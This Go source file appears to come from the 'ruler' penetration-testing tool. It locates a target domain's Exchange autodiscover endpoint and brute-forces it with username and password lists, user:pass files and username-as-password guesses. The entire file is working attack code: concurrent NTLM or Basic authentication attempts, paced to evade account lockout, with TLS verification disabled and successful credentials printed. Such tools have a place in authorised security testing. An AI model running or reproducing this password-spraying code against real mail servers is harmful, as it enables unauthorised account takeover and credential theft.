package autodiscover

import (
	"crypto/tls"
	"fmt"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"os"
	"regexp"
	"strings"
	"time"

	httpntlm "github.com/sensepost/ruler/http-ntlm"
	"github.com/sensepost/ruler/utils"
)

// Result struct holds the result of a bruteforce attempt
type Result struct {
	Username string
	Password string
	Index    int
	Status   int
	Error    error
}

var concurrency = 3 //limit the number of consecutive attempts
var delay = 5
var consc = 3
var usernames []string
var passwords []string
var userpass []string
var autodiscoverURL string
var basic = false
var verbose = false
var insecure = false
var stopSuccess = false
var proxyURL string
var userAgent string
var hostname string
var user_as_pass = true

func autodiscoverDomain(domain string) string {
	var autodiscoverURL string

	//check if this is just a domain or a redirect (starts with http[s]://)
	if m, _ := regexp.Match("http[s]?://", []byte(domain)); m == true {
		autodiscoverURL = domain
		utils.Info.Printf("Using end-point: %s\n", domain)
	} else {
		//create the autodiscover url
		if autodiscoverStep == 0 {
			utils.Info.Println("Trying to Autodiscover domain")
			autodiscoverURL = createAutodiscover(fmt.Sprintf("autodiscover.%s", domain), true)
			utils.Trace.Printf("Autodiscover step %d - URL: %s\n", autodiscoverStep, autodiscoverURL)
			if autodiscoverURL == "" {
				autodiscoverStep++
			}
		}
		if autodiscoverStep == 1 {
			autodiscoverURL = createAutodiscover(fmt.Sprintf("autodiscover.%s", domain), false)
			utils.Trace.Printf("Autodiscover step %d - URL: %s\n", autodiscoverStep, autodiscoverURL)
			if autodiscoverURL == "" {
				autodiscoverStep++
			}
		}
		if autodiscoverStep == 2 {
			autodiscoverURL = createAutodiscover(domain, true)
			utils.Trace.Printf("Autodiscover step %d - URL: %s\n", autodiscoverStep, autodiscoverURL)
			if autodiscoverURL == "" {
				return ""
			}
		}
	}

	req, err := http.NewRequest("GET", autodiscoverURL, nil)
	req.Header.Add("Content-Type", "text/xml")
	req.Header.Add("User-Agent", userAgent)

	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}

	if proxyURL != "" {
		proxy, err := url.Parse(proxyURL)
		if err != nil {
			return ""
		}
		tr = &http.Transport{Proxy: http.ProxyURL(proxy),
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		}
	}

	client := http.Client{Transport: tr}

	resp, err := client.Do(req)

	if err != nil {
		if autodiscoverStep < 2 {
			autodiscoverStep++
			return autodiscoverDomain(domain)
		}
		return ""
	}

	//check if we got prompted for authentication, this is normally an indicator of a valid endpoint
	if resp.StatusCode == 401 || resp.StatusCode == 403 {
		return autodiscoverURL
	}
	if autodiscoverStep < 2 {
		autodiscoverStep++
		return autodiscoverDomain(domain)
	}
	return ""
}

// Init function to setup the brute-force session
func Init(domain, usersFile, passwordsFile, userpassFile, pURL, u, n string, b, i, s, v bool, c, d, t int) error {
	stopSuccess = s
	insecure = i
	basic = b
	verbose = v
	delay = d
	consc = c
	concurrency = t
	proxyURL = pURL
	userAgent = u
	hostname = n

	autodiscoverURL = autodiscoverDomain(domain)

	if autodiscoverURL == "" {
		return fmt.Errorf("No autodiscover end-point found")
	}

	if autodiscoverURL == "https://autodiscover-s.outlook.com/autodiscover/autodiscover.xml" {
		basic = true
	}

	if userpassFile != "" {
		userpass = readFile(userpassFile)
		if userpass == nil {
			return fmt.Errorf("Unable to read userpass file")
		}
		return nil
	}
	usernames = readFile(usersFile)
	if usernames == nil {
		return fmt.Errorf("Unable to read usernames file")
	}
	passwords = readFile(passwordsFile)
	if passwords == nil {
		return fmt.Errorf("Unable to read passwords file")
	}

	return nil
}

// BruteForce function takes a domain/URL, file path to users and filepath to passwords whether to use BASIC auth and to trust insecure SSL
// And whether to stop on success
func BruteForce() {

	attempts := 0
	stp := false

	for index, p := range passwords {
		if index%10 == 0 {
			utils.Info.Printf("%d of %d passwords checked", index, len(passwords))
		}
		if p != "" {
			attempts++
		}
		sem := make(chan bool, concurrency)

		for ui, u := range usernames {
			if u == "" || p == "" {
				continue
			}

			time.Sleep(time.Millisecond * 500) //lets not flood it

			sem <- true

			go func(u string, p string, i int) {
				defer func() { <-sem }()
				out := connect(autodiscoverURL, u, p, basic, insecure)
				out.Index = i

				if verbose == true && out.Status != 200 {
					utils.Fail.Printf("Failed: %s:%s\n", out.Username, out.Password)
					if out.Error != nil {
						utils.Error.Printf("An error occured in connection - %s\n", out.Error)
					}
				}
				if out.Status == 200 {
					utils.Info.Printf("\033[96mSuccess: %s:%s\033[0m\n", out.Username, out.Password)
					//remove username from username list (we don't need to brute something we know)
					usernames = append(usernames[:out.Index], usernames[out.Index+1:]...)
					if stopSuccess == true {
						stp = true
					}
				}
			}(u, p, ui)

		}
		if stp == true {
			return
		}
		for i := 0; i < cap(sem); i++ {
			sem <- true
		}

		if attempts == consc {
			utils.Info.Printf("\033[31mMultiple attempts. To prevent lockout - delaying for %d minutes.\033[0m\n", delay)
			time.Sleep(time.Minute * (time.Duration)(delay))
			attempts = 0
		}
	}

	if user_as_pass {
		sem := make(chan bool, concurrency)

		for ui, u := range usernames {

			time.Sleep(time.Millisecond * 500) //lets not flood it

			sem <- true

			go func(u string, p string, i int) {
				defer func() { <-sem }()
				out := connect(autodiscoverURL, u, p, basic, insecure)
				out.Index = i

				if verbose == true && out.Status != 200 {
					utils.Fail.Printf("Failed: %s:%s\n", out.Username, out.Password)
					if out.Error != nil {
						utils.Error.Printf("An error occured in connection - %s\n", out.Error)
					}
				}
				if out.Status == 200 {
					utils.Info.Printf("\033[96mSuccess: %s:%s\033[0m\n", out.Username, out.Password)
					//remove username from username list (we don't need to brute something we know)
					usernames = append(usernames[:out.Index], usernames[out.Index+1:]...)
					if stopSuccess == true {
						stp = true
					}
				}
			}(u, u, ui)
		}
	}
}

// UserPassBruteForce function does a bruteforce using a supplied user:pass file
func UserPassBruteForce() {

	count := 0
	sem := make(chan bool, concurrency)
	stp := false
	for index, up := range userpass {
		if index%10 == 0 {
			utils.Info.Printf("%d of %d checked", index, len(userpass))
		}
		count++
		if up == "" {
			continue
		}
		// verify colon-delimited username:password format
		s := strings.SplitN(up, ":", 2)
		if len(s) < 2 {
			utils.Fail.Printf("Skipping improperly formatted entry at line %d\n", count)
			continue
		}
		u, p := s[0], s[1]
		count = 0

		//skip blank username
		if u == "" {
			continue
		}

		time.Sleep(time.Millisecond * 500) //lets not flood it

		sem <- true

		go func(u string, p string) {
			defer func() { <-sem }()
			out := connect(autodiscoverURL, u, p, basic, insecure)
			if verbose == true && out.Status != 200 {
				utils.Fail.Printf("Failed: %s:%s\n", out.Username, out.Password)
				if out.Error != nil {
					utils.Error.Printf("An error occured in connection - %s\n", out.Error)
				}
			}
			if out.Status == 200 {
				utils.Info.Printf("\033[96mSuccess: %s:%s\033[0m\n", out.Username, out.Password)
			}
			if out.Status == 200 && stopSuccess == true {
				stp = true
			}
		}(u, p)

	}
	if stp == true {
		return
	}
	for i := 0; i < cap(sem); i++ {
		sem <- true
	}
}

func readFile(filename string) []string {
	var outputs []string

	data, err := os.ReadFile(filename)
	if err != nil {
		utils.Error.Println("Input file not found")
		return nil
	}

	for _, line := range strings.Split(string(data), "\n") {
		outputs = append(outputs, line)
	}
	return outputs
}

func connect(autodiscoverURL, user, password string, basic, insecure bool) Result {
	result := Result{user, password, -1, -1, nil}

	cookie, _ := cookiejar.New(nil)

	tr := &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		DisableKeepAlives: true, //should fix mutex issues
	}
	if proxyURL != "" {
		proxy, err := url.Parse(proxyURL)
		if err != nil {
			result.Error = err
			return result
		}
		tr = &http.Transport{Proxy: http.ProxyURL(proxy),
			TLSClientConfig:   &tls.Config{InsecureSkipVerify: true},
			DisableKeepAlives: true,
		}
	}
	client := http.Client{Transport: tr}

	if basic == false {
		//check if this is a first request or a redirect
		//create an ntml http client
		client = http.Client{
			Transport: &httpntlm.NtlmTransport{
				Domain:    "",
				User:      user,
				Password:  password,
				Insecure:  insecure,
				CookieJar: cookie,
				Proxy:     proxyURL,
				Hostname:  hostname,
			},
		}
	}

	req, err := http.NewRequest("GET", autodiscoverURL, nil)
	req.Header.Add("Content-Type", "text/xml")
	req.Header.Add("User-Agent", userAgent)

	//if basic authi is required, set auth header
	if basic == true {
		req.SetBasicAuth(user, password)
	}

	resp, err := client.Do(req)

	if err != nil {
		//check if this error was because of ntml auth when basic auth was expected.
		if m, _ := regexp.Match("illegal base64", []byte(err.Error())); m == true {
			client = http.Client{Transport: InsecureRedirectsO365{User: user, Pass: password, Insecure: insecure, Transport: tr}}
			resp, err = client.Do(req)
			if err != nil {
				result.Error = err
				return result
			}
		} else {

			result.Error = err
			return result
		}

	}
	if resp != nil {
		defer resp.Body.Close()
	}
	result.Status = resp.StatusCode
	return result
}
